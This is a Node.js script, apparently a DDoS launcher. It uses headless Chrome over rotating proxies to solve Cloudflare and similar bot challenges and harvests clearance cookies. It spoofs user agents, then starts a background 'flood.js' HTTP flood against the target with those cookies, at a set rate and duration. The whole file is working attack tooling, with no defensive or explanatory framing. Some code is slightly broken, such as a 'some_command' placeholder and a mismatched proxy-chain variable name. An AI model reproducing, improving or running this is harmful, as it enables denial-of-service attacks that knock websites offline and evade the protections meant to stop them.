Array.prototype.delete = function(value) {
    this.splice(this.indexOf(value), 1);
};
const randInt = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);
const randList = list => list[Math.floor(Math.random() * list.length)];
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const errorHandler = error => {
//console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const cdp = require('./cdp');
const async = require('async');
const {
    exec
} = require('child_process');
const fs = require('fs');
var geoip = require('geoip-lite');
proxychain = require('proxy-chain')
const args = {
    target: process.argv[2],
    concurrents: +process.argv[3],
    activeProxies: +process.argv[4],
    proxyFile: process.argv[5],
    requestRate: process.argv[6],
    duration: process.argv[7],
};
const colors = {
    ERROR: '\x1b[31m',
    SUCCESS: '\x1b[32m',
    INFO: '\x1b[33m',
    RESET: '\x1b[0m'
};

function adjustedSleep(time) {
    return cdp.sleep(time + 1.75);
}

if (!args.target || !args.concurrents || !args.activeProxies || !args.proxyFile || !args.requestRate || !args.duration) {
    console.clear();
    console.log()
    console.log('Chrome bypass cloudflare (captcha/js/uam) challenges')
    console.error(`
    Usage: node chrome url concurrents activeProxies proxyfile rate time
    Example: node chrome target 30 100 proxy.txt 20 120
    `);
    process.exit(1);
}
const target = new URL(args.target);
const proxies = readLines(args.proxyFile);
const activeProxies = args.activeProxies > proxies.length ? proxies.length : args.activeProxies;
console.clear();
console.log(`- Target: ${args.target}`);
console.log(`- Concurrents: ${args.concurrents}`);
console.log(`- ProxyFile: ${args.proxyFile}`);
console.log(`- Rate: ${args.requestRate}`);
console.log(`- Time: ${args.duration}`);

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
        length
    }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });

    return randomStringArray.join('');
}
const validkey = generateRandomString(5, 10)

function displayStatus(colorCode, content) {
    const brand = '';
    console.log(colorCode + brand + ' ' + content + colors.RESET);
}

function validateCookies(cookies, title,Box) {
    
    if (cookies.trim() === '' || cookies.includes('cf_chl')) {
        return false;
    }
    let tile = title.includes('Just a moment...')
    const has_cf_clearance = cookies.includes('cf_clearance');
    const has_cf_bm = cookies.includes('__cf_bm');
    if (has_cf_clearance && tile) {
        return false
    }
    if (has_cf_bm && !has_cf_clearance) {
        return false;
    }
    if (has_cf_bm && has_cf_clearance && tile) {
        return false;
    }

    if (has_cf_bm && has_cf_clearance && !tile && Box === null ) {
        return true;
    }
    if (has_cf_bm && has_cf_clearance && !tile && Box !== null ) {
    return false
    }
    return true;
}
async function performActions(session, maxRetries = 3) {
    let attempt = 0;
    let title = null;
    let content = null;
    let error = null;

    while (attempt < maxRetries) {
        try {
            title = await session.getTitle();
            content = await session.getContent();
            return { title, content };
        } catch (e) {
            attempt++;
            error = e;
            console.error(`Attempt ${attempt} failed: ${e.message}`);
            await cdp.sleep(2); 
        }
    }

    throw new Error('Failed after maximum retries: ' + error.message);
}

async function handleCloudflareChallenges(session, task) {
    const maxAttempts = 30;
    let attempts = 0;
    let boundingBox;

    while (attempts < maxAttempts) {
        boundingBox = await session.getBoundingBox('body > div.main-wrapper > div > div > div > div');
        
        if (boundingBox && boundingBox.width && boundingBox.height) {
            await session.locator(boundingBox.x, boundingBox.y, boundingBox.width, boundingBox.height).click(2.7);
            await cdp.sleep(10); // d?i 10s sau khi nh?p (5)
            return; 
        } else {
            console.log("Can't find BoundingBox... Trying again");
            await session.captureScreenshot('screenshot.png');
            await session.reload();
            await cdp.sleep(10); // th? l?i 10
            attempts++;
        }
    }

    console.log("ERR://PROXY IN LOOP", task.flare);
    return;
}

async function checkCookiesAndFlood(session, task, data) {
    const Box = await session.getBoundingBox('body > div.main-wrapper > div > div > div > div');
    if (!validateCookies(data.cookies, data.pageTitle, Box)) {
        displayStatus(colors.INFO, task.proxyAddress + ' - Proxy address got broken cookies');
        await session.captureScreenshot('sig.png');
        proxies.delete(task.proxyAddress);
        const newProxy = randList(proxies);
        if (newProxy) {
            console.log(`retrying: ${newProxy}`);
            task.proxyAddress = newProxy;
            queue.push(task);
        } else {
            console.log('no more proxies available.');
        }
        return false;
    }
    return true;
}
const HandleCD = async (session, task) =>{
    const maxAttempts = 30;
    let attempts = 0;
    let boundingBox;
    while (attempts < maxAttempts) {
        boundingBox = await session.getBoundingBox('#verifyButton');
        
        if (boundingBox && boundingBox.width && boundingBox.height) {
            await session.locator(boundingBox.x, boundingBox.y, boundingBox.width, boundingBox.height).click(1);
            await cdp.sleep(10);
            return; 
        } else {
            console.log("Can't find BoundingBox... Trying again");
            await session.captureScreenshot('screenshot.png');
            await session.reload();
            await cdp.sleep(10);
            attempts++;
        }
    }

    console.log("ERR://CANT BYPASS", task.flare);
    return;
}

const argss = process.argv.slice(2);
let flood = null,
    query = null,
    post = null,
    userinfo1 = null,
    cookie = null;
    solvee = 0
    startTime = performance.now();

const queryIndexa = argss.indexOf('--type');
flood = queryIndexa !== -1 ? argss[queryIndexa + 1] : null;

const queryIndexg = argss.indexOf('--query');
query = queryIndexg !== -1 ? argss[queryIndexg + 1] : null;

const queryIndexp = argss.indexOf('--post');
post = queryIndexp !== -1 ? argss[queryIndexp + 1] : null;

const queryIndexb = argss.indexOf('--user');
userinfo1 = queryIndexb !== -1 ? argss[queryIndexb + 1] : null;

const queryIndexcookie = argss.indexOf('--cookie');
cookie = queryIndexcookie !== -1 ? argss[queryIndexcookie + 1] : null;

async function bypass(task, executed) {
    terget = target.href.replace("%rand", "")
    locatedprint = await randInt(110, 131);
    versionwindows = await randInt(7, 11);
    const browsers = [
        {
            name: 'chrome',
            userAgent: 'Mozilla/5.0 (Windows NT ' + versionwindows + '.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + locatedprint + '.0.0.0 Safari/537.36',
            platform: 'Windows',
            mobile: false
        },
        {
            name: 'firefox',
            userAgent: 'Mozilla/5.0 (Windows NT ' + versionwindows + '.0; Win64; x64; rv:' + locatedprint + ') Gecko/20100101 Firefox/' + locatedprint + '',
            platform: 'Windows',
            mobile: false
        },
        {
            name: 'edge',
            userAgent: 'Mozilla/5.0 (Windows NT ' + versionwindows + '.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/' + locatedprint + '.0.0.0 Safari/537.36',
            platform: 'Windows',
            mobile: false
        },
        {
            name: 'opera',
            userAgent: 'Mozilla/5.0 (Windows NT ' + versionwindows + '.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + locatedprint + '.0.4606.81 Safari/537.36 OPR/' + locatedprint + '.0.0.0',
            platform: 'Windows',
            mobile: false
        },
        {
            name: 'safari',
            userAgent: 'Mozilla/5.0 (Windows NT ' + versionwindows + '.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Version/' + locatedprint + '.0.0 Safari/537.36',
            platform: 'Windows',
            mobile: false
        },
        {
            name: 'brave',
            userAgent: 'Mozilla/5.0 (Windows NT ' + versionwindows + '.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/' + locatedprint + '.0.0.0 Safari/537.36',
            platform: 'Windows',
            mobile: false
        }
    ];

    const getRandomBrowser = () => {
        return browsers[Math.floor(Math.random() * browsers.length)];
    };

    let invalproxy

    if (userinfo1 === 'true'){
        proxyurl = 'http://' + task.user + ':' + task.pass + '@' + task.flare + ':' + task.port
        invalproxy = await proxychain.anonymizeProxy(proxyurl);
    } else {
        invalproxy = 'http://' + task.proxyAddress
    }

    const selectedBrowser = getRandomBrowser();

    const options = {
        headless: true,
        userAgentOverrideRequest: {
            userAgent: selectedBrowser.userAgent,
            acceptLanguage: "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
            userAgentMetadata: {
                platform: selectedBrowser.platform,
                mobile: selectedBrowser.mobile,
                architecture: "x86_64",
                model: '',
                platformVersion: "5.15.0"
            }
        },
        args: [
            '--no-sandbox',
            '--proxy-server=' + invalproxy,
            // ...runtask1,
        ]
    };

    const session = await cdp.launch(options);
    try {
        await session.goto(target);
        console.log('WAIT FOR PAGE LOAD');
        await cdp.sleep(20);

        const { title, content } = await performActions(session);

        if (title === 'Attention Required! | Cloudflare') {
            displayStatus(colors.INFO, task.proxyAddress + ' - You have been blocked');
            proxies.delete(task.proxyAddress);
            const newProxy = randList(proxies);
            if (newProxy) {
                console.log(`Retrying with proxy: ${newProxy}`);
                task.proxyAddress = newProxy;
                queue.push(task);
            } else {
                console.log('no more proxies available');
            }
            return;
        }

        const uar = await session.evaluate(() => navigator.userAgentData);
        // console.log(content);

        if (content.includes('challenges.cloudflare.com')) {
            console.log('\nFOUND CLOUDFLARE CHALLENGE', task.flare);
            console.log('data:', uar);
            await handleCloudflareChallenges(session, task);
        } else if (content.includes("/uam.js")) {
            console.log('FOUND CD CHALLANGE');
            await HandleCD(session, task)
        } else {
            await session.captureScreenshot('gg.png');
            console.log('Unknown Challenge or not found', task.proxyAddress);
            await session.reload();
            await cdp.sleep(30); // 15
        }

        const title1 = await session.getTitle();
        const data = {
            solved: solvee++,
            pageTitle: title1,
            proxyAddress: task.proxyAddress,
            userAgent: await session.evaluate(() => navigator.userAgent),
            cookies: await session.getCookies()
        };

        const validCookies = await checkCookiesAndFlood(session, task, data);
        if (!validCookies) return;
        const shellh2 = `screen -dm node flood.js ${args.target} ${args.duration} 18 ${data.proxyAddress} ${args.requestRate} "${data.cookies}" "${data.userAgent}" ${"Linux-arm-"+locatedprint} ${validkey} --post ${post} --query ${query} --cookie ${cookie}`;

        const displaySuccess = (data) => {
            console.log("\nsuccess");
            for (const [key, value] of Object.entries(data)) {
                console.log(` - ${key}: ${typeof value === 'string' ? `'${value}'` : value}`);
            }
            console.log('');
        };
        displaySuccess(data);

        exec(shellh2);

    } catch (exception) {
        displayStatus(colors.INFO, task.proxyAddress + ' - failed to bypass solve');
        proxies.delete(task.proxyAddress);
        const newProxy = randList(proxies);
        if (newProxy) {
            console.log(`retrying: ${newProxy}`);
            task.proxyAddress = newProxy;
            queue.push(task);
        } else {
            console.log('no more proxies available');
        }
    } finally {
        await session.close();
        if (userinfo1 === 'true') { await proxyChain.closeAnonymizedProxy(invalproxy, true); }
        const queueLength = queue.length();
        executed(null, {
            task,
            queueLength
        });
    }
}
const queue = async.queue(bypass, args.concurrents);
async function prepareTasks() {
    for (let index = 0; index < activeProxies; index++) {
        const proxyAddress = randList(proxies);
        flare = proxyAddress.split(':')
        proxies.delete(proxyAddress);
        const task = {
            proxyAddress: proxyAddress,
            flare: flare[0],
            user:flare[2], 
            pass: flare[3],
            port: flare[1]
        };
        queue.push(task);
    }
    await queue.drain();
    console.log('\nAll tasks done!');
   
const executionTime = startTime - performance.now();  
console.log(`Execution Time: ${executionTime} ms`);
    process.exit(1);
}
prepareTasks();
const Script = (validkey) => {
    exec(`pkill -f ${validkey}`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing pkill -f ${validkey}: ${error.message}`);
            return;
        }
        console.log(`pkill -f ${validkey} executed successfully.`);
    });

    exec("pkill -f chrome", (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing pkill -f chrome: ${error.message}`);
            return;
        }
        console.log("pkill -f chrome executed successfully.");
    });

    exec("pkill -f node flood.js", (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing pkill -f node flood.js: ${error.message}`);
            return;
        }
        console.log("pkill -f node flood.js executed successfully.");
    });

    const child = exec(`some_command`);

    child.on('close', (code, signal) => {
        console.log(`Child process terminated with code ${code} and signal ${signal}`);
        process.exit();
    });
};
process.on('SIGINT', () => {
    console.log('Received SIGINT. Exiting...');
    Script()
    process.exit(0);
});